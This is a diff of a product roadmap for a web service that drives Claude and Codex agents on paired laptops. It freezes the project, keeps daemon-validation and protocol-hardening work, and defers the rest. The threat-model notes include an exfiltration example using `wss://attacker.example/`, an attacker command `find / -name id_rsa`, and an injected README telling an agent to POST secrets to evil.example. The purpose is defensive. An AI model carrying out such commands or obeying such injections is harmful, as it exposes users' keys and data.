@@ -1,14 +1,29 @@
 # Roadmap
 
+> **2026-05-18 — closeout notice.** This repo validated the
+> embedded-agent-driving concept (M1–M4.9 shipped). The polished product is
+> being built in a new repo `vvibe` (greenfield per
+> [portaly-vibe ADR-001](../portaly-vibe/docs/oss/ADR-001-architecture.md)),
+> targeting non-technical creators with an in-dashboard agent driver that
+> replaces the original MCP+skill copy-paste flow.
+>
+> This roadmap is frozen except for **Milestone 6 (cross-platform daemon
+> validation)** and a small set of M10 security items whose work carries to
+> the new repo. Everything else is listed under "Won't do — deferred to
+> vvibe new repo" below; those items either don't apply to the creator
+> product or get reframed against Postgres + Drizzle + Better Auth in the
+> new repo.
+
 The product today is a working multi-user SaaS: a cloud-hosted web UI
 (`agent-web-mvp-renddi.fly.dev`) where users sign in with GitHub, pair their
 own laptops via a device-code flow, and drive Claude / Codex agents that run
 on those laptops with file-system access. Sessions and chat history survive
 server restarts.
 
-What's left is hardening, Codex feature parity, cross-platform daemon
-validation, UX polish, and the breakouts that block real multi-instance
-deployment (audit log, persistent message pruning, shared state for HA).
+What's left in this repo is the daemon-side closeout work that the new
+repo will inherit: cross-platform service registration validation and the
+protocol-level security hardening that travels with the daemon binary and
+the WS contract.
 
 Tags:
 
@@ -233,25 +248,7 @@ re-pair via the device-token hash migration.
 
 ---
 
-## Open
-
-### Milestone 5 — Codex parity
-
-**Why:** today Codex is "stateless per prompt" and has no permission UI.
-
-- **P0** Switch from `codex exec "<prompt>"` to `codex exec --json` (stream-
-  json output). Adapter parses the same shape as Claude.
-- **P0** Move stderr UTF-8 / CP950 decoding (lost in the M1 daemon rewrite)
-  into a small utility on the daemon side using
-  `golang.org/x/sys/windows.MultiByteToWideChar`. The current daemon Codex
-  runner passes raw bytes through, so localized error messages on Windows
-  render as mojibake.
-- **P1** Codex session resume (multi-turn chat memory). The Session
-  already persists a `resume_token` field — wire the Codex CLI's resume
-  flag through `daemon_run_prompt` + `runner_codex.go`.
-- **P1** Surface Codex's own approval flow in the UI (it has
-  `--ask-for-approval` modes). Either route through our permission modal
-  or expose its yes/no inline.
+## Closeout milestones
 
 ### Milestone 6 — Cross-platform daemon validation
 
@@ -275,262 +272,79 @@ end-to-end tested; M1's Node-bridge approach also assumes Node is on PATH.
   fails. Options: install via Task Scheduler under the user account, or
   store absolute paths to the agent binaries in `client.json`.
 
-### Milestone 7 — UX gaps
+### Milestone 10 (selected) — Protocol & daemon security hardening
 
-**Why:** quality-of-life things flagged during MVP validation.
-
-- **P2** Show connected devices in the web UI. Hello already carries
-  `displayName`; the UI just doesn't render the list. Useful when a user
-  has more than one machine.
-- **P2** Device picker on new-session if the user has multiple daemons.
-  `DeviceRegistry.pickRunner(userId)` currently returns the first.
-- **P2** `agent-client status` returns "Access is denied" without admin
-  on Windows because it queries SCM. Fall back to `sc query` for the read
-  path, or remember the install location and probe the OS-appropriate way.
-- **P2** File / dir browser when picking `cwd` for a new session (today
-  it's a free-text input that's easy to mistype).
-- **P2** File-diff viewer for `Edit` tool use results.
-- **P2** Notifications when a permission request lands (browser
-  `Notification` API; the UI is otherwise easy to leave open and miss).
-- **R**  Tauri tray app to wrap the daemon with a visible icon, login UI,
-  device naming. Includes the code-signing work above.
-
-### Milestone 8 — Reliability & ops
-
-- **P0** Rate-limit `/api/device/pair-init`. Today anyone can spam it and
-  fill the `pairing_codes` table; expiry sweeps clean up but the burst
-  cost is unbounded.
-- **P1** Reconnect on the browser side: `WSClient` does exponential
-  backoff up to 10s; verify it survives long backgrounded tabs and
-  laptop sleeps. (Also check cookie expiry vs. WS lifetime — sid cookie
-  is 30 days but a stale session would still get 401 on upgrade.)
-- **P1** Daemon heartbeat from server side: server should evict devices
-  that miss N pongs.
-- **P2** Pruning: keep last N messages per session in memory, the rest
-  on disk; lazy-load on session select. Carried over from M4 P1.
-- **P2** Audit log of agent invocations (who, when, what cwd, what
-  tools). Carried over from M3 P2.
-- **P2** Export / import a session as JSON (debugging, support).
-- **P2** Structured logs (JSON to stderr in prod), shipped via the
-  daemon's log file or a cloud sink.
-- **P2** Metrics: prompt count, tool invocations, error rate per session.
-
-### Milestone 9 — Horizontal scale (when we actually need it)
-
-**Why:** today everything's in a single Fly machine and `fly.toml` pins
-`min_machines_running = 1` with no HA. The constraint is structural:
-`DeviceRegistry` and the in-memory `RemoteRunner` correlation tables only
-exist on the machine the daemon WS landed on. A browser routed to a
-sibling machine has no path to the daemon.
-
-- **R**  Pick a shared-state substrate. Cheapest: a Redis pub/sub fanout
-  for `daemon_*` events keyed by `runId`, plus a `device_id → machine_id`
-  lookup so a browser request can be sticky-routed or proxied.
-- **R**  Or sidestep with sticky sessions at the Fly proxy layer — but
-  Fly's HTTP-based affinity doesn't carry into long-lived WS, and
-  daemon connection isn't tied to a browser session anyway.
-- **P2** Until that lands, do not raise `min_machines_running`.
-
-### Milestone 10 — Token budget & deeper defense (deferred from M4.7)
-
-**Why:** M4.7 shipped the six highest-leverage items from a token-budget
-threat model + second-round security audit. The rest below — observability,
-per-user quotas, daemon-side belt-and-braces, supply-chain hardening — are
-the medium-complexity / longer-tail items from that same audit. Some land
-in adjacent milestones (e.g. cwd allowlist sits between this and M6).
-
-#### Observability + user-visible budget
-
-- **P0** **O-1 / O-2** Per-session token + cost counting. Claude Agent
-  SDK's `result` message carries `usage` and `total_cost_usd`; pipe it
-  through `daemon_done` and accumulate on `Session`. Add a user setting
-  "daily budget $X" — soft warning at 80%, server-side hard refusal at
-  100% (must explicitly raise to continue). Codex CLI doesn't surface
-  usage today, so it falls back to a prompts/day quota.
-- **P1** **O-5** Audit log UI: "Last 30 days" page listing prompt time,
-  cwd, token/cost, device, IP. We already store `agent_sessions` +
-  `agent_messages`; this is mostly read-side.
-- **P2** **O-4** Anomalous-activity detector + forced re-OAuth (IP
-  country jump, UA flip, prompt rate ≫ historical baseline). Needs the
-  `auth_events` table first.
-
-#### Per-user rate limiting
-
-- **P0** **B-5** WebSocket rate limit. HTTP endpoints have one, WS
-  `send_prompt` doesn't. Per-(userId, sessionId) token bucket, ~10/min.
-- **P1** **B-1** `quota_events` table for per-user/session/day prompt
-  caps. Cheap window query before each `enqueuePrompt`.
-- **P2** **B-4** Cancel watchdog — re-evaluate after B-3 has been live
-  for a while. If zombie runs persist past `cancel()` we add a 5s
-  deadline + force-kill; otherwise skip.
-
-#### Defense in depth
+**Why:** three P0 items from the M4.7 follow-up audit whose work *carries
+to the vvibe new repo* — the daemon binary and the WS protocol shape both
+travel forward, so hardening here means the new repo inherits a validated
+contract instead of having to rediscover the threat model. Everything else
+from the original Milestone 10 is listed under "Won't do" below; the
+audit/observability tail reframes under PRD-002 in the new repo.
 
 - **P0** **N-6** zod schema for `daemon_message` / `daemon_done`. Even
   a user's own malicious daemon can spoof `role: 'user'` to inject fake
-  history rows; the JSON shape is currently trust-on-faith.
-- **P1** **N-2** Tighten CSP `connect-src` from `ws:`/`wss:` (host
-  wildcard) to `'self'`. Closes any future XSS → data exfil via
-  `new WebSocket('wss://attacker.example/')`.
-- **P1** **N-5** Origin middleware: refuse requests with no Origin
-  header on state-changing endpoints (allowlist daemon endpoints
-  separately). Today undefined Origin is permitted as a permissive
-  default.
-- **P1** **D-1** Daemon-side `budget.json` (per-hour prompts, per-run
-  duration, daily soft/hard cap in USD). Daemon enforces independently
-  of the server — even if our server is compromised, the user can't be
-  billed past their local cap. The "we can't bill you past your local
-  cap" story is also a marketing differentiator.
-- **P2** **D-2** `vvibe usage` CLI: prints today's local-tracked
-  spend regardless of server state. Side benefit of D-1.
-- **P2** **L-7** Codex daemon: require `CODEX_ARGS` to contain
-  `--sandbox` (and ideally `--ask-for-approval`) when
-  `CODEX_TRUST_DEFAULTS=1`. Today setting trust-defaults without those
-  args silently degrades to full-auto.
-
-#### Tool / cwd scoping
-
+  history rows; the JSON shape is currently trust-on-faith. Protocol
+  contract carries to new repo.
 - **P0** **H-3** Daemon cwd allowlist. `vvibe allow ~/code` adds a
   permitted root; daemon refuses any `cwd` outside the union of allowed
   roots. Closes "attacker hijacks session → `find / -name id_rsa`"
-  paths. Bigger feature: needs CLI subcommand, config file format,
-  startup-time validation, UI hint when a session targets a denied
-  cwd.
-- **P1** **P-5** Per-session tool allowlist. `NewSessionDialog`
-  exposes a checkbox list; SDK takes `allowedTools`. Defaults to
-  Read/Edit/Bash; WebFetch/WebSearch require an explicit opt-in. Cuts
-  off "injected README tells Claude to POST secrets to evil.example"
-  at the tool layer.
-- **P2** **P-3** `cwd` change requires modal confirm (changing cwd =
-  changing prompt-injection surface).
-
-#### Onboarding + comms
-
-- **P2** **A-1** Onboarding screen / docs: link to Anthropic Console
-  → Settings → Monthly spend limit as the last-resort backstop. Pure
-  docs.
-- **P2** **A-4** Event push: "daily token total reached $X", "login
-  from a new IP/UA", "daemon budget tripped". Start with in-UI banner;
-  email later.
-
-#### Supply chain (sits with M6)
-
-- **R**  **N-4** Release trust root. `vvibe upgrade` currently trusts
-  whoever can push to GitHub Releases. Add protected branches, OIDC +
-  Sigstore/cosign, fine-grained PATs. Code-signing (already M6 P1) is
-  the upstream half.
-
-#### Won't do / consciously skipped
-
-- **P-1** "User must be active in last N min to send prompt." Adds
-  complexity; B-* gates cover the same threat model with less UX cost.
-- **N-7** Pair-lookup info leak (any authed user can probe a code's
-  device name). Pair codes are short-lived; signal value is low.
-- **L-1 to L-6** Batched into a future "polish" cycle, not action-
-  worthy on their own.
-
-### Milestone 11 — Deployment portability
-
-**Why:** today the only production-tested deployment is Fly.io (`fly.toml`,
-single 256 MB `nrt` machine). The `Dockerfile` is generic, but no other
-target has been validated end-to-end, the README hard-codes the Fly URL,
-and a prospective self-hoster who doesn't want to use Fly has to figure it
-out from scratch.
-
-A Workers + Durable Objects + D1 alternative was evaluated (May 2026) and
-consciously rejected: it would lock self-hosters onto Cloudflare and
-contradict the "self-hostable" claim that drove the project's open-source
-positioning in the first place. This milestone widens the set of "where
-can I run this?" answers along the *container-PaaS* axis while keeping
-the Fly path intact and not committing to any cloud-proprietary primitive.
-
-Orthogonal to **Milestone 9 (horizontal scale)** — each target still
-inherits the single-process `DeviceRegistry` constraint. This milestone
-is about more *places* to put one machine, not more *machines*.
-
-- **P0** **Validate `@anthropic-ai/claude-agent-sdk` on non-Fly runtimes.**
-  The server-local fallback path (anon dev mode in `server/agents/claude.ts`)
-  imports the SDK directly; the daemon bridge spawns it as a subprocess.
-  Confirm both paths work inside a vanilla `node:22-alpine` container
-  running on Cloud Run / Railway / a Hetzner VPS — no Fly-specific
-  assumptions about network, fs, or process model. Prerequisite for
-  everything below; if it doesn't work somewhere, that target gets
-  dropped early instead of late.
-
-- **P0** **Cloudflare Containers deployment recipe.** Same `Dockerfile`,
-  add the CF Containers config + `docs/deploy/cloudflare-containers.md`.
-  Verify: persistent volume equivalent for `/data/app.db`, long-lived
-  WS connection lifetime (no idle eviction), `PUBLIC_URL` / `ALLOWED_ORIGINS`
-  env wiring. If first-class persistent storage isn't available, document
-  the external-SQLite fallback (Turso / Tigris) rather than papering over.
-
-- **P0** **README "Deploy" section restructured.** From "deploy to Fly"
-  to a short matrix of validated targets with one-line trade-off blurbs
-  (idle cost, scale-to-zero, region, persistent storage). "Validated"
-  means there's a tested recipe in `docs/deploy/<target>.md`. Anything
-  not in the matrix stays out of the claim surface.
-
-- **P1** **Generic VPS / docker-compose recipe.** Target persona: Hetzner
-  / DigitalOcean / OCI Free Tier owner. `docs/deploy/vps.md` plus a
-  reference `docker-compose.yml`: Caddy fronts both `/ws` and `/client`
-  upgrades with auto-TLS, named volume for `/data`, `.env` template
-  driving `PUBLIC_URL` and the GitHub OAuth creds. This is the
-  deployment most aligned with the "true self-host" persona — the one
-  that justifies refusing the B route.
-
-- **P1** **Google Cloud Run recipe.** Only mainstream PaaS that
-  scale-to-zeros *and* supports WebSockets — biggest cost win for
-  low-traffic instances. Caveat: Cloud Run caps a single WS connection
-  at 60 minutes and then forces a reconnect. Validate that `client-go`
-  reconnect resumes cleanly and that an in-flight `runId` doesn't get
-  orphaned across the cap. If it does, surface it as M8 reliability
-  work and gate this recipe behind that fix.
-
-- **P1** **Railway / Render quickstart.** One-click GitHub-repo deploys
-  on both; mostly a matter of adding `railway.json` / `render.yaml`
-  and the corresponding "Deploy" buttons. Low effort but doesn't expand
-  the universe much — same shape as Fly, different vendor.
-
-- **P2** **Deploy buttons in the README** for everything in the validated
-  matrix. Low engineering cost, disproportionate perceived-credibility
-  cost when missing.
-
-- **P2** **Per-target cost & ops notes.** Short paragraph or table in
-  each `docs/deploy/<target>.md`: "For 1–20 users you'll pay ~$X/mo on
-  this target; egress matters above 100 GB/mo; for 100+ users see
-  M9 first." Stops users from picking the wrong target for their use
-  case.
-
-- **R**  **Single-binary server distribution.** Bundle Node +
-  `server/*.ts` into one statically-linked executable
-  (`pkg` / `nexe` / Bun `--compile`). Goal: `wget vvibe-server-linux-x64 &&
-  ./vvibe-server` on any VPS — no Docker, no Node toolchain. Mirrors
-  the daemon's GoReleaser story. Open questions: better-sqlite3's
-  native binding, the install-script-serving path, final image size.
-
-- **R**  **External-storage fallback for scale-to-zero targets.** If
-  Cloud Run scale-to-zero is to be more than "the volume keeps the
-  machine warm", `/data/app.db` needs an off-machine home. Evaluate
-  Turso (libSQL — drop-in for better-sqlite3 in many spots), Tigris,
-  or managed Postgres + drizzle/Kysely abstraction. Tracks closely
-  with M9's shared-state work — if the abstraction lands there, this
-  comes nearly for free.
+  paths. Daemon-side, travels with `client-go/`. Needs CLI subcommand,
+  config file format, startup-time validation, UI hint when a session
+  targets a denied cwd.
+- **P0** **B-5** WebSocket rate limit on `send_prompt`. Per-(userId,
+  sessionId) token bucket, ~10/min. Borderline (server-side, throwaway
+  Express stack), but the threat-model + token-bucket pattern reuses in
+  the new repo — cheap to ship here as a reference.
 
 ---
 
-## Cross-cutting follow-ups (caught during M1–M4 implementation)
+## Won't do — deferred to vvibe new repo
 
-- **/client endpoint trust**: a leaked `device_token` lets anyone
-  impersonate that user's daemon. Currently tokens never rotate or
-  expire. Add a "revoke device" action in the UI + a rotation mechanic
-  before any wider rollout.
-- **Local server fallback**: when no daemon is connected for an authed
-  user, sessions go to `RemoteRunner` which errors immediately with
-  "No daemon connected." That's intentional — but the UI doesn't pre-empt
-  it with "Pair a device first." Worth a banner.
-- **Windows file-content visibility weirdness** observed during M3 token
-  debugging: PowerShell `Get-Content` and the Go binary's `loadConfig()`
-  reported divergent contents for `client.json` for a brief window
-  (Get-Content showed empty token; show-config showed the real token,
-  same path). Couldn't isolate to OneDrive vs. Defender vs. FS cache.
-  Worth re-checking if it recurs.
+These milestones do not advance in this repo. Each entry notes where the
+work goes in the new repo (or why it dissolves). Full historical content
+is preserved in git history before this commit.
+
+- **Milestone 5 — Codex parity.** Creator product targets non-technical
+  users; Claude Code is the primary embedded agent. Codex / Cursor
+  remain an open architectural question in the new repo, not committed
+  work.
+- **Milestone 7 — UX gaps** (device picker, dir browser, diff viewer,
+  notifications, Tauri tray). Current web UI is throwaway. Equivalent
+  needs reappear inside the new repo's creator dashboard (PRD-001 §6.8);
+  re-scope from creator-first principles rather than porting.
+- **Milestone 8 — Reliability & ops.** Server-side reliability work
+  (rate-limit on pair-init, cookie-vs-WS lifetime, persistent message
+  pruning, audit log, structured logs, metrics) doesn't carry — the
+  Express server is being thrown away. Daemon-side reliability
+  (heartbeat, reconnect) folds into M6.
+- **Milestone 9 — Horizontal scale.** The constraint (in-memory
+  `DeviceRegistry` and `browsers` maps) dissolves in the new repo's
+  Postgres + multi-process design (ADR-001 §3.3). No explicit milestone
+  needed; it's a property of the new stack.
+- **Milestone 10 remainder** (O-1/O-2 token+cost counting, O-4 anomaly
+  detector, O-5 audit log UI, B-1 quota_events, B-4 cancel watchdog,
+  N-2 CSP tightening, N-5 Origin middleware, D-1 daemon `budget.json`,
+  D-2 `vvibe usage` CLI, P-5 per-session tool allowlist, P-3 cwd-change
+  modal, L-7 Codex sandbox-args enforcement, A-1 onboarding budget
+  docs, A-4 event push, N-4 release trust root). Audit / observability
+  tail reframes under PRD-002 in the new repo; per-user quotas and
+  budget caps fold into new-repo Stripe + Audit milestones; CSP /
+  Origin tightening is server-side throwaway and reappears when the
+  new Next.js app is written; daemon-side `budget.json` + `vvibe usage`
+  travel with the daemon to the new repo and re-enter as daemon-track
+  milestones.
+- **Milestone 11 — Deployment portability.** New repo gets its own
+  deployment story per ADR-001 §4.10: `docker-compose` baseline plus
+  reference deployments for Fly.io, Render, Cloud Run. The Workers + DO
+  alternative remains consciously rejected (creator product still
+  needs to be self-hostable on commodity infrastructure).
+- **Cross-cutting follow-ups (M1–M4):**
+  - *device-token rotation* — carries; new repo's Better Auth rotates
+    user session tokens natively, but the daemon device-token rotation
+    is its own design.
+  - *"Pair a device first" UI banner* — throwaway (current web UI gone).
+  - *Windows file-content visibility quirk* (OneDrive/Defender) — keep
+    as a known issue for the daemon; re-check if it surfaces in the
+    new repo's pairing flow.
+
+
